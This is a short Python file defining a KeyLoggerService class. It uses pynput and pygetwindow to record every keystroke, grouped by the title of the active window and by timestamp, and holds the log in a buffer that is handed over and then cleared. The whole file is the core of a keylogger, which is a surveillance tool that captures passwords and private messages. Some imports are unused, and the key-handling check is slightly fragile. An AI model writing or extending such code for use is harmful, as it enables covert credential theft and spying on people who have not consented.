import time
from pynput import keyboard
from datetime import datetime
import pygetwindow as gw
from abc import ABC, abstractmethod
import json




class KeyLoggerService:

    def __init__(self):
        self.data = {}

    def get_data(self):
        data = self.data.copy()
        self.data.clear()
        return data

    def get_keyword(self, key):
        window = self._get_window()
        if window not in self.data:
            self.data[window] = {}
        time = self._get_time()
        if time not in self.data[window]:
            self.data[window][time] = ""
        if hasattr(key,"char") and key is not None:
            self.data[window][time] += key.char
        elif str(key)=="Key.space":
            self.data[window][time] += " "
        else:
            self.data[window][time] += f" [{key}] "


    def _get_time(self):
        return datetime.now().strftime("%Y-%m-%d %H:%M")

    def _get_window(self):
        return gw.getActiveWindow().title
